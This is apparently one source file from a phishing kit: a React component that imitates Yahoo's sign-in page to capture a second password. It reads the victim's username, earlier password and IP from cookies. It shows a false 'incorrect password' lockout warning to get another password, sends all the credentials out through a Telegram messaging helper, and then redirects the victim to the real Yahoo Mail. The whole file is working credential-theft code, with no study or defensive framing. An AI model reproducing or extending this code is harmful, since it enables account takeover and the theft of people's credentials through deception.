import React from "react";
import TelegramSend from "../utils/send-message";
import cookies from "../utils/cookie.config";

export default function SecondPass() {
  const username: Username = cookies.get("username");
  const login1: Login = cookies.get("login");
  const visitorIP = cookies.get("ip");

  const [formInput, setFormInput] = React.useState<Login2>({
    username2: username.username,
    password2: "",
  });

  const [isLoading, setIsLoading] = React.useState(false);

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true);
    
    const message = `
  [----+ YAHOO (USERNAME) +----]

  IP: ${visitorIP}

  USERNAME: ${username.username}

  PASSWORD: ${login1.password}

  PASSWORD 2: ${formInput.password2}

  `;
    await TelegramSend(message);
    window.location.replace("https://mail.yahoo.com/");
    setIsLoading(false);
  }

  return (
    <>
      <form
        id="login-username-form"
        onSubmit={handleSubmit}
        method="post"
        className="pure-form"
      >
        <p style={{ fontSize: 12, color: "red" }}>
          Incorrect password, you have 2 more chances before your account is
          locked for 2 hours.
        </p>
        <br />
        <div
          id="username-country-code-field"
          className="username-country-code puree-country-inline-dropdown-disabled code-of-length-3"
        >
          <div className="input-group">
            <input
              className="phone-no"
              type="text"
              value={username.username}
              disabled
              required
              id="login-username"
              onChange={handleInputChange}
              autoComplete="username"
              autoCapitalize="none"
              autoCorrect="off"
              autoFocus={true}
              placeholder=" "
            />

            <label
              htmlFor="login-username"
              id="login-label"
              className="login-label"
            >
              Username, email, or&nbsp;mobile
            </label>
            <ul
              className="auto-fill-overlay hide"
              aria-live="polite"
              id="domain-auto-fill"
            >
              <li data-fill="yahoo.com" tabIndex={2}>
                yahoo.com
              </li>
              <li data-fill="gmail.com" tabIndex={3}>
                gmail.com
              </li>
              <li data-fill="outlook.com" tabIndex={4}>
                outlook.com
              </li>
              <li data-fill="aol.com" tabIndex={5}>
                aol.com
              </li>
            </ul>
          </div>
          <div className="input-group">
            <input
              className="phone-no"
              type="password"
              name="password2"
              required
              id="login-username"
              onChange={handleInputChange}
              autoComplete="username"
              autoCapitalize="none"
              autoCorrect="off"
              autoFocus={true}
              placeholder=" "
            />

            <label
              htmlFor="login-username"
              id="login-label"
              className="login-label"
            >
              Password
            </label>
            <ul
              className="auto-fill-overlay hide"
              aria-live="polite"
              id="domain-auto-fill"
            >
              <li data-fill="yahoo.com" tabIndex={2}>
                yahoo.com
              </li>
              <li data-fill="gmail.com" tabIndex={3}>
                gmail.com
              </li>
              <li data-fill="outlook.com" tabIndex={4}>
                outlook.com
              </li>
              <li data-fill="aol.com" tabIndex={5}>
                aol.com
              </li>
            </ul>
          </div>
          <div className="hidden-input-container">
            <input
              name="passwd"
              className="pwd-field"
              type="password"
              tabIndex={-1}
              aria-hidden="true"
              role="presentation"
              autoCorrect="off"
              placeholder="Password"
            />
          </div>
        </div>
        <p id="username-error" className="error-msg hide" role="alert"></p>

        <div className="button-container">
          <input
            id="login-signin"
            type={isLoading ? "button" : "submit"}
            name="signin"
            className="pure-button puree-button-primary challenge-button"
            value={isLoading ? "Please wait..." : "Login"}
            data-rapid-tracking="true"
            data-ylk="elm:btn;elmt:primary;slk:next;mKey:next"
          />
        </div>

        <div className="helper-links-container">
          <div className="helper-item">
            <span className="stay-signed-in checkbox-container">
              <input
                id="persistent"
                name="persistent"
                value="y"
                type="checkbox"
                checked={false}
              />
              <label htmlFor="persistent">Stay signed&nbsp;in</label>
            </span>
          </div>
          <div className="helper-item arlink">
            <span className="help">
              <a
                href="https://login.yahoo.com/forgot?intl=us&amp;specId=usernameregsimplified&amp;done=https%3A%2F%2Fwww.yahoo.com%2F"
                id="mbr-forgot-link"
                data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:forgot"
                data-rapid-tracking="true"
              >
                Forgot&nbsp;username?
              </a>
            </span>
          </div>
        </div>

        <div className="bottom-links-container has-social-buttons">
          <p className="sign-up-link">
            <a
              href="https://login.yahoo.com/account/create?intl=us&amp;specId=usernameregsimplified&amp;done=https%3A%2F%2Fwww.yahoo.com%2F"
              id="createacc"
              role="button"
              className="pure-button puree-button-secondary challenge-button"
              data-rapid-tracking="true"
              data-ylk="elm:link;elmt:secondary;slk:signup;mKey:signup"
            >
              Create an&nbsp;account
            </a>
          </p>

          <div id="social-login-container" className="social-login-container">
            <div className="or-cont-with-desc challenge-feedback-text">
              Or, continue&nbsp;with
            </div>
            <ul className="social-login">
              <li className="items-cont-1">
                <button
                  type="submit"
                  id="tpa-google-button"
                  name="tpaProvider"
                  value="google"
                  className="pure-button sc-button items-1 sc-google sc-google-button"
                  data-rapid-tracking="true"
                  data-ylk="elm:btn;slk:google-btn;mKey:google-social-btn"
                >
                  <label className="offscreen">google</label>
                </button>
              </li>
            </ul>
          </div>
        </div>
      </form>
    </>
  );
}
